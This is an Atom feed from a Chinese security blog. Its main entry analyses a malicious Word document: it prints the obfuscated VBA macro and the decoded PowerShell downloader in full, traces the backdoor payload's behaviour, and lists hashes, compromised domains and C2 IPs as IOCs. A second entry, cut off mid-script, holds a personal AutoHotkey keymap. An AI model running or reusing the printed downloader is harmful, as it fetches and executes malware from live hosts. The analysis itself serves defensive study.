<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偽のブログ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xwdidi.top/"/>
  <updated>2019-10-24T09:01:24.903Z</updated>
  <id>http://xwdidi.top/</id>
  
  <author>
    <name>Xuwei98</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某个后台pe木马较不完整分析</title>
    <link href="http://xwdidi.top/2019/10/24/2019-10-24-pe%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://xwdidi.top/2019/10/24/2019-10-24-pe木马分析/</id>
    <published>2019-10-23T16:00:00.000Z</published>
    <updated>2019-10-24T09:01:24.903Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下最近分析的一个样本,自己依然是个菜鸡,有很多不足,希望各位师傅提出错误我努力学习.我头发都没了.此木马发送用户信息加密,能进行远程后门访问等功能,导入函数和导出函数只有一个,大量的动态加载api. </p><p>idb和样本都放下面学习链接那了.</p><h2 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h2><ul><li>样本名称: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282-1571228285.doc</li><li>样本大小:  182,784</li><li>MD5:  b72f31807db78e70eb2c45993dd2a4e1</li><li>SHA-256: c1fff4d580677f66da1841e882d94f17bc04068d</li><li>SHA-1: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282</li><li>样本来源:  <a href="https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/" target="_blank" rel="noopener">https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/</a></li></ul><h2 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h2><ul><li>环境: VMware15 , Win10 专业版, Office 365</li></ul><h2 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h2><p><img src="https://i.loli.net/2019/10/21/Njwsd3ZYCkHugeq.png" alt="image.png"></p><h2 id="0x04-详细分析"><a href="#0x04-详细分析" class="headerlink" title="0x04 详细分析"></a>0x04 详细分析</h2><h3 id="一-打开doc-宏代码"><a href="#一-打开doc-宏代码" class="headerlink" title="一. 打开doc,宏代码"></a>一. 打开doc,宏代码</h3><p><code>Alt+F11</code>查看调试宏代码</p><p>三个模块分别为<code>Pibafqel</code>,<code>Nzolhtmfybml</code>,<code>Xhnbvwxbzhq</code>.<code>Nzolhtmfybml</code>里面是空的,其他两个里面充满类似家庭地址的注释,使用脚本删除掉后进行调试翻译.去除无用混淆,大多数都只是定义,声明的函数.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> XXX()</span><br><span class="line">            ;这种格式表示一个函数</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen() </span><br><span class="line">            ;运行文档时候，自动运行宏</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>调试后发现,在<code>autoopen</code>中使用过函数有<code>Hsbahypqju()</code>和<code>Abiufkgnjgdiv(Kmtifafrucqb)</code>.</p><p>化简:<img src="https://i.loli.net/2019/10/18/pR8JMlgx3KU1Ci9.png" alt="image.png"></p><h4 id="autopen"><a href="#autopen" class="headerlink" title="autopen()"></a>autopen()</h4><p>调用<code>Hsbahypqju()</code>,</p><h4 id="Hsbahypqju"><a href="#Hsbahypqju" class="headerlink" title="Hsbahypqju()"></a>Hsbahypqju()</h4><p>遇到个office坑比的地方,通过监视窗口只能查看前250个字符,所以最好通过<code>Debug.Print</code>打印变量,能看到全部字符串</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Hsbahypqju()</span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> Dtzjcfqgj = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:win32_processstartup"</span>)</span><br><span class="line">Dtzjcfqgj.ShowWindow = <span class="number">0</span>#</span><br><span class="line">    Thbjfvedxuqm = <span class="string">"powershell -e &lt;# https://www.microsoft.com/ #&gt; $Eywrqrdqbmw='Rzhvtqwrc';$Jcwhciloutn = '846';$Ctyrqdpzavru='Wixhqavur';$Bpaqqzwo=$env:userprofile+'\'+$Jcwhciloutn+'.exe';$Yawfxccmy='Ezlignhvinnmt';$Tlvpwcruuo=.('new-'+'obj'+'ect') NEt.WebClIENT;$Jznyrpyuqf='http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'."</span>sp`LiT<span class="string">"('*');$Ufiwicmkrdst='Ohjtzdywhuim';foreach($Lygaeckfk in $Jznyrpyuqf)&#123;try&#123;$Tlvpwcruuo."</span>d`OwNLoa`D`FILE<span class="string">"($Lygaeckfk, $Bpaqqzwo);$Tlncrdhw='Fvsotfnt';If ((&amp;('G'+'et-It'+'em') $Bpaqqzwo)."</span>LE`NgtH<span class="string">" -ge 23622) &#123;[Diagnostics.Process]::"</span>s`TARt<span class="string">"($Bpaqqzwo);$Getujvyyonwg='Gppbzmrdhoel';break;$Cgphukmh='Hhiypojok'&#125;&#125;catch&#123;&#125;&#125;$Pyreoccwfqy='Whyolyeyvhts'"</span></span><br><span class="line"><span class="keyword">Set</span> Ywlbxgbmzrxh = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:Win32_Process"</span>)</span><br><span class="line">Finrmepurj = Ywlbxgbmzrxh.Create(Thbjfvedxuqm, Ncrmxklxbct, Dtzjcfqgj, Pxajxegluaugg) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><ol><li><p>创建一个<code>winmgmts:win32_processstartup</code>对象,仅用于将信息传递给<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener"><strong>Win32_Process</strong></a>类的<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/create-method-in-class-win32-process" target="_blank" rel="noopener"><strong>Create</strong></a>方法。</p></li><li><p>隐藏窗口</p></li><li><p>命令行字符串</p></li><li><p>创建<code>winmgmts:Win32_Process</code>对象</p></li><li><p>通过<code>Win32_Process</code>方法<code>Creat</code>运行字符串.<code>-e</code>为<code>-EncodeCommand</code>.<code>powershell -e</code>运行base64编码的字符串.</p><p>Create(命令行,子进程路径,启动配置,进程od)`</p></li></ol><h4 id="Abiufkgnjgdiv-Kmtifafrucqb"><a href="#Abiufkgnjgdiv-Kmtifafrucqb" class="headerlink" title="Abiufkgnjgdiv(Kmtifafrucqb)"></a>Abiufkgnjgdiv(Kmtifafrucqb)</h4><p>将传入的字符串中的<code>0xdc3</code>替换为空,恢复字符串的作用.</p><h3 id="二-PowerShell脚本分析"><a href="#二-PowerShell脚本分析" class="headerlink" title="二. PowerShell脚本分析"></a>二. PowerShell脚本分析</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Eywrqrdqbmw</span>=<span class="string">'Rzhvtqwrc'</span>;</span><br><span class="line"><span class="variable">$Jcwhciloutn</span> = <span class="string">'846'</span>;</span><br><span class="line"><span class="variable">$Ctyrqdpzavru</span>=<span class="string">'Wixhqavur'</span>;</span><br><span class="line"><span class="variable">$Bpaqqzwo</span>=<span class="string">"%userprofile%\846.exe"</span>;</span><br><span class="line"><span class="variable">$Yawfxccmy</span>=<span class="string">'Ezlignhvinnmt'</span>;</span><br><span class="line"><span class="variable">$Tlvpwcruuo</span>=.(<span class="string">'new-object'</span>) NEt.WebClIENT;</span><br><span class="line"><span class="variable">$Jznyrpyuqf</span>=<span class="string">'http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'</span>.<span class="string">"spLiT"</span>(<span class="string">'*'</span>);</span><br><span class="line"><span class="variable">$Ufiwicmkrdst</span>=<span class="string">'Ohjtzdywhuim'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Lygaeckfk</span> <span class="keyword">in</span> <span class="variable">$Jznyrpyuqf</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$Tlvpwcruuo</span>.<span class="string">"dOwNLoaDFILE"</span>(<span class="variable">$Lygaeckfk</span>, <span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Tlncrdhw</span>=<span class="string">'Fvsotfnt'</span>;</span><br><span class="line"><span class="keyword">If</span> ((&amp;(<span class="string">'Get-Item'</span>) <span class="variable">$Bpaqqzwo</span>).<span class="string">"LENgtH"</span> <span class="nomarkup">-ge</span> <span class="number">23622</span>) &#123;</span><br><span class="line">[Diagnostics.Process]::<span class="string">"sTARt"</span>(<span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Getujvyyonwg</span>=<span class="string">'Gppbzmrdhoel'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="variable">$Cgphukmh</span>=<span class="string">'Hhiypojok'</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Pyreoccwfqy</span>=<span class="string">'Whyolyeyvhts'</span></span><br></pre></td></tr></table></figure><ol><li>创建<code>WebClient</code>对象</li><li>调用<code>downloadfile</code>方法通过用<code>*</code>分割好的数组的链接遍历下载文件并存储为<code>%userprofile%\846.exe</code></li><li>如果长度大于23622,则启动<code>846.exe</code>程序.</li><li>最后一个网址疑似被挂马,可能已被入侵作为传播中转站.</li></ol><h3 id="三-846-exe"><a href="#三-846-exe" class="headerlink" title="三. 846.exe"></a>三. 846.exe</h3><p>位置: %userprofile%\846.exe</p><p>名称: 846.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p><img src="https://i.loli.net/2019/10/22/BTgSAonUl9yt8hj.png" alt="image.png"></p><p>时间是最近创建的.无壳,使用vs2015编译.</p><h4 id="0x01行为分析"><a href="#0x01行为分析" class="headerlink" title="0x01行为分析"></a>0x01行为分析</h4><p>根据<code>ProcessExplorer</code>观察程序执行大概流程.<code>846.exe</code>执行后会启动一个新进程 后杀掉自己.新进程名为<code>dasmrcdasmrc.exe</code>,地址为<code>%LOCALAPPDATA%\dasmrcdasmrc.exe</code></p><p><img src="https://i.loli.net/2019/10/19/HTRUwcAivas2org.png" alt="image.png"></p><h4 id="0x02-详细分析"><a href="#0x02-详细分析" class="headerlink" title="0x02 详细分析"></a>0x02 详细分析</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>存在唯一的导出函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>,<code>EntryPoint</code>为<code>0x00004960</code></p><p><code>CIRC OLE Control DLL</code>可能某个样本种类吧.</p><h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><h6 id="0x01-Winmain"><a href="#0x01-Winmain" class="headerlink" title="0x01 Winmain"></a>0x01 Winmain</h6><p><img src="https://i.loli.net/2019/10/20/NcUVFW846Dnsdpu.png" alt="image.png"></p><p>通过导出表获取函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>的地址,跳转执行.</p><h6 id="0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF"><a href="#0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF" class="headerlink" title="0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()"></a>0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()</h6><p><img src="https://i.loli.net/2019/10/19/SpXs2N7LhHjlxae.png" alt="image.png"></p><p>获取<code>VirtualAlloc</code>函数地址,以使得后续能拷贝执行数据.</p><p><img src="https://i.loli.net/2019/10/20/1zagy6WxLV5qbUe.png" alt="image.png"></p><h6 id="0x03-解密数据执行"><a href="#0x03-解密数据执行" class="headerlink" title="0x03 解密数据执行"></a>0x03 解密数据执行</h6><p><img src="https://i.loli.net/2019/10/20/G68gUqlMVekoZPD.png" alt="image.png"></p><ol><li><p><code>sub_1E0467</code>函数通过传如对应函数<code>hash</code>值获取所需api地址.</p><p>sub_1e0467:<img src="https://i.loli.net/2019/10/20/umYZlpwNtLsWyh8.png" alt="image.png"></p><p><code>(((FS:[30])+0xC)+0xC)</code>获取<code>Ldr</code>的地址,后面进行遍历和比较最终得到所需要的地址. 参考链接放在下面了.</p><p><img src="https://i.loli.net/2019/10/20/MWcG5X49TLRKm2k.png" alt="image.png"></p><p>根据<code>PE</code>偏移,获取各个节的数据.</p><p><img src="https://i.loli.net/2019/10/20/ZqJdnRFG1a58zuL.png" alt="image.png"></p></li><li><p>申请空间</p><p><img src="https://i.loli.net/2019/10/20/BnvoZT7Qj2tHrcl.png" alt="image.png"></p></li><li><p>拷贝后门程序<code>pe</code>数据.这时候顺便去dump内存被复制的pe数据,(毕竟可能不用修复重定位(x).</p><p><img src="https://i.loli.net/2019/10/21/sag2pfOBJl4Xjer.png" alt="age.png">得知程序入口RVA为<code>0x1000</code>, 基地址为<code>0x60000</code>,所以起始地址为<code>0x610000</code>,块大小为<code>D200</code></p></li><li><p>内存页属性修改</p><p>修改代码段为可执行可读属性.</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p><p>​    修改数据段为可读属性</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p></li><li><p>执行新pe文件的代码段,这时候顺便dump下来pe数据.</p><p><img src="https://i.loli.net/2019/10/21/iqM9bLgCnea3HZd.png" alt="image.png"></p></li></ol><h6 id="0x04-内存pe执行"><a href="#0x04-内存pe执行" class="headerlink" title="0x04 内存pe执行"></a>0x04 内存pe执行</h6><ol><li><p>拷贝数据</p><p><img src="https://i.loli.net/2019/10/22/USjyGrmZscb65WH.png" alt="image.png"></p></li><li><p>获取模块全称和地址</p><p><img src="https://i.loli.net/2019/10/21/zDvtGSpbCxBrAh4.png" alt="image.png"></p></li><li><p>计算key</p><p><img src="https://i.loli.net/2019/10/22/KomgIQ1Cl3J62Fr.png" alt="image.png"></p></li><li><p>格式化参数</p><p><img src="https://i.loli.net/2019/10/22/pxGhAcSVIn1gHmb.png" alt="image.png"></p></li><li><p>计算出的命令行参数和从右往左取现有命令行进行比较,如果命令相等则执行内部函数.不相等的话执行下列流程</p><p><img src="https://i.loli.net/2019/10/21/xtZ1VL8AzhvXHbi.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/gbc4lvu9BhtA6qJ.png" alt="image.png"></p></li><li><p>不相等后</p><p>执行后续程序,最终<code>CreateProcessW</code></p><p>创建新的自身进程并附加对应计算出的命令参数:<br><img src="https://i.loli.net/2019/10/21/Nto42xPCwM19S8z.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/qTyEN2M5O3VaxkF.png" alt="image.png"></p></li><li><p>退出进程</p><p><img src="https://i.loli.net/2019/10/21/E41zgYRTi3nZJyG.png" alt="image.png"></p></li></ol><h6 id="0x05-主要功能"><a href="#0x05-主要功能" class="headerlink" title="0x05 主要功能"></a>0x05 主要功能</h6><h6 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2019/10/21/gTuZNbcDyrnVJEf.png" alt="image.png"></h6><p>使用上述的命令行字符串进行调试,这时候为了方便使用之前解密后dump下来的pe数据.</p><p>二者字符串相等进入<code>sub_30B8AB</code>.</p><p><img src="https://i.loli.net/2019/10/24/XSZhrkpJOo4zIFB.png" alt="image.png"></p><p>通过互斥量执行主要功能函数函数,等待<code>4000ms</code></p><p><img src="https://i.loli.net/2019/10/24/BcQegxCy5mJIvq8.png" alt="image.png"></p><p>功能大致分布区域,通过对固定内存空间的值进行校验赋值,依次执行不同功能</p><ol><li><p>系统进程获取</p><p><img src="https://i.loli.net/2019/10/24/tYqLebN5KmjS3lT.png" alt="image.png"></p><p><code>sub_302255</code><img src="https://i.loli.net/2019/10/24/SdyeljR6A5rpo8O.png" alt="image.png"></p><p>进程名存储:<img src="https://i.loli.net/2019/10/23/lM42Ns8oqFrZOHh.png" alt="image.png"></p></li><li><p>信息发送</p><p><img src="https://i.loli.net/2019/10/24/FatXzjZlEN9Lco6.png" alt="image.png"></p><p>发送流程</p><p><img src="https://i.loli.net/2019/10/24/T6hCc8joDS2UHwg.png" alt="image.png"></p></li><li><p>注册自启动</p><p><img src="https://i.loli.net/2019/10/24/I5HK64yL21sqhNm.png" alt="image.png"></p></li><li><p>新文件</p><p><img src="https://i.loli.net/2019/10/24/jYRchepluf3CWEO.png" alt="image.png"></p><p>启动<img src="https://i.loli.net/2019/10/24/21x6OJq9XuA4zwN.png" alt="image.png"></p></li><li><p>令牌获取</p><p><img src="https://i.loli.net/2019/10/24/cJhGPRE3abTzV2W.png" alt="image.png"></p><p>高权限执行</p><p><img src="https://i.loli.net/2019/10/24/K4S9RY8EmUjawpk.png" alt="image.png"></p></li><li><p>移动文件</p><p><img src="https://i.loli.net/2019/10/24/p9lZFEDwT8HWtq2.png" alt="image.png"></p><p>使用<code>SHFileOperationW</code>操作文件</p><p><img src="https://i.loli.net/2019/10/24/cFmnrQpLTHCx4IU.png" alt="image.png"></p></li></ol><h3 id="四-dasmrcdasmrc-exe"><a href="#四-dasmrcdasmrc-exe" class="headerlink" title="四. dasmrcdasmrc.exe"></a>四. dasmrcdasmrc.exe</h3><p>位置: %localappdata%\dasmrcdasmrc\dasmrcdasmrc.exe</p><p>名称: dasmrcdasmrc.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p> 和846同一文件,并执行了木马函数.</p><h2 id="0x05-恶意ip"><a href="#0x05-恶意ip" class="headerlink" title="0x05 恶意ip"></a>0x05 恶意ip</h2><p>通过<code>fiddler</code>,发包可知恶意流量ip地址.</p><p><img src="https://i.loli.net/2019/10/21/VB3IYgWGQEMzi6y.png" alt></p><h2 id="0x06-IOC"><a href="#0x06-IOC" class="headerlink" title="0x06 IOC"></a>0x06 IOC</h2><p>MD5</p><p>b72f31807db78e70eb2c45993dd2a4e1 </p><p>e83c5ba6be05ec51ae6ceb2470fcfdf3</p><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><table><thead><tr><th><a href="javascript:" target="_blank" rel="noopener">complaintboardonline.com</a></th><th><a href="http://ip.tool.chinaz.com/?ip=35.200.131.105" target="_blank" rel="noopener">35.200.131.105</a></th></tr></thead><tbody><tr><td><a href="javascript:" target="_blank" rel="noopener">watonlight.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=144.34.202.247" target="_blank" rel="noopener">144.34.202.247</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">frazischool.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.241.24.165" target="_blank" rel="noopener">103.241.24.165</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">sagarngofoundation.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=35.154.167.80" target="_blank" rel="noopener">35.154.167.80</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">naturerepublickh.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.91.65.133" target="_blank" rel="noopener">103.91.65.133</a></td></tr></tbody></table><table><thead><tr><th>http:\\</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>14.160.93.230</td><td style="text-align:center">/forced/ringin/</td></tr><tr><td>74.208.68.48:8080</td><td style="text-align:center">/attrib/srvc/symbols/merge/</td></tr><tr><td>104.131.58.132:8080</td><td style="text-align:center">/report/publish/symbols/merge/</td></tr><tr><td>68.183.190.199:8080</td><td style="text-align:center">/xian/schema/symbols/merge/</td></tr><tr><td>62.75.143.100:7080</td><td style="text-align:center">/report/</td></tr><tr><td>159.203.204.126:8080</td><td style="text-align:center">/devices/mult/</td></tr><tr><td>151.80.142.33</td><td style="text-align:center">/symbols/enable/symbols/</td></tr><tr><td>123.168.4.66:22</td><td style="text-align:center">/report/iplk/</td></tr><tr><td>46.28.111.142:7080</td><td style="text-align:center">/merge/psec/symbols/merge/</td></tr><tr><td>46.101.212.195:8080</td><td style="text-align:center">/symbols/badge/</td></tr><tr><td>183.82.97.25</td><td style="text-align:center">/between/balloon/symbols/merge/</td></tr><tr><td>190.10.194.42:8080</td><td style="text-align:center">/balloon/health/symbols/merge/</td></tr><tr><td>217.199.160.224:8080</td><td style="text-align:center">/json/site/</td></tr><tr><td>186.1.41.111:443</td><td style="text-align:center">/bml/splash/symbols/merge/</td></tr><tr><td>185.86.148.222:8080</td><td style="text-align:center">/results/teapot/symbols/</td></tr><tr><td>185.187.198.10:8080</td><td style="text-align:center">/results/walk/</td></tr><tr><td>200.57.102.71:8443</td><td style="text-align:center">/scripts/</td></tr><tr><td>114.79.134.129:443</td><td style="text-align:center">/guids/</td></tr></tbody></table><h2 id="学习链接与资源"><a href="#学习链接与资源" class="headerlink" title="学习链接与资源"></a>学习链接与资源</h2><p><a href="https://github.com/Xuwei98/malware-analysis/tree/master/Trojan/2019-10-18-word-pe木马" target="_blank" rel="noopener">样本和idb放这里了</a></p><p><a href="https://green-m.me/2018/04/26/find-api-adress-by-hash/" target="_blank" rel="noopener">通过Hash查找API函数地址</a></p><p><a href="https://blog.csdn.net/anda0109/article/details/50013523" target="_blank" rel="noopener">CryptoAPI</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向分析" scheme="http://xwdidi.top/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="病毒与木马" scheme="http://xwdidi.top/tags/%E7%97%85%E6%AF%92%E4%B8%8E%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Autohotkey脚本,自用</title>
    <link href="http://xwdidi.top/2019/10/17/2019-10-17-autohotkey/"/>
    <id>http://xwdidi.top/2019/10/17/2019-10-17-autohotkey/</id>
    <published>2019-10-16T16:00:00.000Z</published>
    <updated>2019-10-20T07:07:53.382Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="注册表切换键位"><a href="#注册表切换键位" class="headerlink" title="注册表切换键位"></a>注册表切换键位</h3><p><code>Esc</code>和<code>CapsLock</code>相互映射,<code>RAlt</code>变为<code>RShift</code>.在任何键盘都是可以使用的.毕竟注册表优先级更高.</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>本质来说是使用注册表中的扫描码映射<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</code></p><p><code>Esc</code>和<code></code>CapsLock`相互映射,可以这样写:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</span><br><span class="line"> <span class="string">"Scancode Map"</span>=hex:<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">03</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span></span><br></pre></td></tr></table></figure><p>当然原理是这样的,我是用的是<code>SharpKeys</code>,开源链接在下方.</p><h3 id="AutoHotKey"><a href="#AutoHotKey" class="headerlink" title="AutoHotKey"></a>AutoHotKey</h3><p>使用软件<code>AutoHotKey</code>进行热键设置,下面是我现在使用的脚本.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">!F10::</span><br><span class="line">Send &#123;Volume_Down&#125;</span><br><span class="line">return</span><br><span class="line">!F11::</span><br><span class="line">Send &#123;Volume_Up &#125;</span><br><span class="line">Return</span><br><span class="line">!F12::</span><br><span class="line">Send &#123;Volume_Mute&#125;</span><br><span class="line">Return</span><br><span class="line"></span><br><span class="line">Esc::Send, &#123;Esc&#125;</span><br><span class="line">;方向键映射</span><br><span class="line">Esc &amp; i::Send, &#123;Up&#125;</span><br><span class="line">Esc &amp; j::Send, &#123;Left&#125;</span><br><span class="line">Esc &amp; l::Send, &#123;Right&#125;</span><br><span class="line">Esc &amp; k::Send, &#123;Down&#125;</span><br><span class="line"></span><br><span class="line">;单词移动</span><br><span class="line">Esc &amp; u::Send, ^&#123;Left&#125;</span><br><span class="line">Esc &amp; o::Send, ^&#123;Right&#125;</span><br><span class="line">Esc &amp; n::Send, ^&#123;Up&#125;</span><br><span class="line">Esc &amp; m::Send, ^&#123;Down&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;翻页</span><br><span class="line">Esc &amp; &apos;::Send, &#123;PgUp&#125;</span><br><span class="line">Esc &amp; /::Send, &#123;PgDn&#125;</span><br><span class="line">;左选一个单词</span><br><span class="line">!+j::Send, +^&#123;Left&#125;</span><br><span class="line">;右选一个单词</span><br><span class="line">!+l::Send, +^&#123;Right&#125;</span><br><span class="line"></span><br><span class="line">;选择一行</span><br><span class="line">Esc &amp; y::Send, &#123;home&#125;&#123;home&#125;&#123;shiftdown&#125;&#123;end&#125;&#123;ShiftUp&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;home</span><br><span class="line">Esc &amp; ,::Send, &#123;home&#125;</span><br><span class="line">;End</span><br><span class="line">Esc &amp; .::Send, &#123;end&#125;</span><br><span class="line"></span><br><span class="line">;窗口移动</span><br><span class="line">Esc &amp; s::Send, #&#123;Left&#125;</span><br><span class="line">Esc &amp; f::Send, #&#123;Right&#125;</span><br><span class="line">Esc &amp; e::Send, #&#123;Up&#125;</span><br><span class="line">Esc &amp; d::Send, #&#123;Down&#125;</span><br><span class="line"></span><br><span class="line">;删除</span><br><span class="line">Esc &amp; h::Send, &#123;BackSpace&#125;</span><br><span class="line">;刷新</span><br><span class="line">Esc &amp; 5::Send, &#123;f5&#125;</span><br><span class="line">;关闭单页</span><br><span 